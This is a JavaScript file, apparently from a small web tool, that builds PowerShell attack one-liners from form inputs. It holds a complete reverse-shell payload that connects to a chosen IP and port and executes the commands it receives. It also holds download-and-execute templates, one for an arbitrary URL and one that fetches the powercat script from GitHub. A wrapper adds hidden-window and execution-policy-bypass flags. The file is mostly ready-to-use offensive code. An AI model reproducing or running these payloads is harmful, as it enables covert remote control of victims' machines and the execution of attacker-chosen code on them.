let results = document.getElementById("results");

const wrap = text => `powershell -nop -noni -W hidden -Exec Bypass -c "${text}"`;
const debugwrap = text => `powershell "${text}"`;


const custom = (url) => `IEX (New-Object Net.WebClient).DownloadString('${url}')`;
const powercat = (command) => `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); ${command}`;
const minimal = (ip, port) => `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;

function generate() {
    let wrapperType = document.querySelector('input[name="wrapper"]:checked').value;
    let scriptType = document.querySelector('input[name="script"]:checked').value;
    let ip = document.getElementById("ip").value;
    let port = document.getElementById("port").value;
    let command = document.getElementById("command").value;
    let url = document.getElementById("url").value;

    let script;

    switch (scriptType) {
        case "custom":
            script = custom(url);
            break;
        case "powercat":
            script = powercat(command);
            break;
        case "minimal":
            script = minimal(ip, port);
            break;
    }
    switch (wrapperType) {
        case "nowrapper":
            results.innerText = script;
            break;
        case "wrapper":
            results.innerText = wrap(script);
            break;
        case "debugwrapper":
            results.innerText = debugwrap(script);
            break;
    }
}